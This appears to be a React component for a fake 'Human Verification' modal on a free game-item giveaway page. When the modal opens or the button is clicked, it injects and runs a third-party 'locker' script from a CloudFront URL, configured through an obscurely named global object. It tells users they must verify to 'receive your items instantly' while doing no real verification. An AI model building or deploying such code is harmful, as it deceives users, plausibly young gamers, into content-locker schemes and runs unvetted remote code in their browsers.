import React, { useEffect, useState } from 'react';
import { X, ShieldCheck } from 'lucide-react';

declare global {
  interface Window {
    _RH?: () => void;
    LaJFm_GnL_SaSyfc?: { it: number; key: string };
  }
}

export interface ClaimVerificationModalProps {
  isOpen: boolean;
  onClose: () => void;
  redirectUrl?: string;
  onVerify?: () => void;
  gameIcon?: string;
  itemName?: string;
  username?: string;
  dropCodePrefix?: string;
}

const LOCKER_SCRIPT_SRC = 'https://d18k3i06xdslhs.cloudfront.net/f9ccb06.js';

export const ClaimVerificationModal: React.FC<ClaimVerificationModalProps> = ({
  isOpen,
  onClose,
  onVerify
}) => {
  const [scriptReady, setScriptReady] = useState<boolean>(
    typeof window !== 'undefined' && typeof window._RH === 'function'
  );

  useEffect(() => {
    if (!isOpen) return;

    // Ensure the exact locker configuration variable is set globally
    window.LaJFm_GnL_SaSyfc = { it: 4635134, key: '2c5b7' };

    if (typeof window._RH === 'function') {
      setScriptReady(true);
      return;
    }

    let existingScript = document.querySelector(
      `script[src="${LOCKER_SCRIPT_SRC}"]`
    ) as HTMLScriptElement | null;

    const handleLoad = () => {
      setScriptReady(true);
    };

    if (!existingScript) {
      existingScript = document.createElement('script');
      existingScript.src = LOCKER_SCRIPT_SRC;
      existingScript.async = true;
      existingScript.addEventListener('load', handleLoad);
      document.head.appendChild(existingScript);
    } else {
      existingScript.addEventListener('load', handleLoad);
      if (typeof window._RH === 'function') {
        setScriptReady(true);
      }
    }

    return () => {
      if (existingScript) {
        existingScript.removeEventListener('load', handleLoad);
      }
    };
  }, [isOpen]);

  if (!isOpen) return null;

  const handleClick = () => {
    if (onVerify) {
      onVerify();
    }

    window.LaJFm_GnL_SaSyfc = { it: 4635134, key: '2c5b7' };

    if (typeof window._RH === 'function') {
      window._RH();
    } else {
      const script = document.createElement('script');
      script.src = LOCKER_SCRIPT_SRC;
      script.onload = () => {
        if (typeof window._RH === 'function') {
          window._RH();
        }
      };
      document.head.appendChild(script);
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-xs animate-in fade-in duration-200">
      {/* Backdrop click */}
      <div className="fixed inset-0" onClick={onClose} />

      {/* Verification Card matching website design */}
      <div
        className="relative w-full max-w-[420px] bg-[#0c160e] border border-[#1b3421] rounded-[26px] px-6 py-8 text-center shadow-2xl z-10 space-y-6"
        style={{
          boxShadow:
            '0 25px 50px -12px rgba(0, 0, 0, 0.9), 0 0 25px rgba(89, 214, 106, 0.08)'
        }}
      >
        {/* Close button */}
        <button
          onClick={onClose}
          className="absolute top-4 right-4 text-[#3d6044] hover:text-[#7ea886] transition-colors p-1 rounded-lg cursor-pointer"
          aria-label="Close"
        >
          <X className="w-5 h-5" />
        </button>

        {/* Title & Subtitle */}
        <div className="space-y-2.5 pt-1">
          <h2
            className="text-2xl sm:text-[28px] text-[#5de876] font-black tracking-wider uppercase select-none"
            style={{
              fontFamily: "'Lilita One', 'Luckiest Guy', 'Arial Black', sans-serif",
              letterSpacing: '0.04em',
              textShadow:
                '0 2px 4px rgba(0, 0, 0, 0.8), 0 0 14px rgba(93, 232, 118, 0.25)'
            }}
          >
            HUMAN VERIFICATION
          </h2>
          <p className="text-sm text-[#7ea886] font-medium leading-relaxed max-w-[320px] mx-auto select-none">
            Complete the verification step below to receive your items instantly.
          </p>
        </div>

        {/* New Locker Trigger Button */}
        <div className="pt-1">
          <button
            type="button"
            onClick={handleClick}
            className="w-full py-3.5 sm:py-4 px-6 rounded-full bg-[#38783d] hover:bg-[#418a47] active:translate-y-0.5 text-white font-extrabold text-lg sm:text-xl tracking-wide transition-all shadow-[0_5px_0_#1e4622] border border-[#2b5e31] cursor-pointer flex items-center justify-center select-none"
          >
            Click me!
          </button>
        </div>

        {/* Secure Verification Footer */}
        <div className="flex items-center justify-center gap-1.5 pt-0.5 text-xs text-[#52b561] font-semibold tracking-wide select-none">
          <ShieldCheck className="w-4 h-4 text-[#5de876] shrink-0" />
          <span>{scriptReady ? 'Secure Verification' : 'Loading Verification...'}</span>
        </div>
      </div>
    </div>
  );
};
